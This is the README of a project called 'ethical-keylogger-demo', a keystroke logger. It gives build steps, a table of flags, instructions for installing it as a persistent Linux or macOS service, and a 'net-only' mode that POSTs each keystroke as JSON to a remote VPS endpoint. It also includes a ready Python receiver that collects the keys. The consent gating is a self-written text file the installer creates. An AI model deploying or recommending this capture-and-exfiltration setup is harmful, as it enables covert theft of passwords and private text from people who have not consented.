# ethical-keylogger-demo

Keystroke logger with optional remote log shipping via HTTP POST.

## Build

```bash
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build
```

## Quick start

```bash
# Interactive (logs to cwd, Ctrl+C to stop)
./build/keylogger --consent

# With remote logging (mirror = local file + HTTP POST)
./build/keylogger --consent \
    --net-mode mirror \
    --net-endpoint http://your-vps:8080/logs
```

## Flags

| Flag | Description |
|------|-------------|
| `--consent` | Start logging interactively |
| `--service` | Unattended mode (requires `--consent-file`) |
| `--consent-file <path>` | File whose first line is: `I OWN THIS SYSTEM AND CONSENT TO LOGGING` |
| `--log-dir <path>` | Log output directory (default: cwd) |
| `--session-tag <str>` | Tag added to every event (1-64 chars, `[A-Za-z0-9_-]`) |
| `--install` | Register as system service (requires sudo) |
| `--uninstall` | Remove system service (requires sudo) |
| `--status` | Check if service is registered/running |
| `--force` | With `--install`, overwrite existing registration |
| `--net-mode <mode>` | `off` (default), `mirror` (local + remote), `net-only` (remote only) |
| `--net-endpoint <url>` | HTTP endpoint, e.g. `http://your-vps:8080/logs` |
| `--net-timeout-ms <n>` | Connect/send timeout in ms (default: 5000) |
| `--net-retry-max <n>` | Retries per event (default: 3) |

## Network logging

When `--net-mode` is `mirror` or `net-only`, each keystroke event is HTTP POSTed as JSON:

```
POST /logs HTTP/1.1
Content-Type: application/json

{"ts":"2026-05-02T17:30:45.123Z","vk":65,"key":"a","down":true,"os":"macos","session_tag":null}
```

Your server just needs to accept the POST and return 200. Events are sent on a background thread and never block keystroke capture. Failed sends are retried with backoff, then dropped.

### Minimal receiver (Python, no dependencies)

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        with open("keys.jsonl", "a") as f:
            f.write(body.decode() + "\n")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

Run on your VPS: `python3 receiver.py`

## Log format

Newline-delimited JSON (`.jsonl`). Each event:

```json
{"ts":"2026-05-02T14:30:00.123Z","vk":65,"key":"a","down":true,"os":"linux","session_tag":"lab-01"}
```

## Service install

```bash
# Linux (systemd)
sudo ./build/keylogger --install \
    --consent-file /etc/keylogger/consent.txt \
    --log-dir /var/log/keylogger

# macOS (launchd) - grant Input Monitoring in System Settings
sudo ./build/keylogger --install \
    --consent-file /etc/keylogger/consent.txt \
    --log-dir /var/log/keylogger

# Check / remove
./build/keylogger --status
sudo ./build/keylogger --uninstall
```
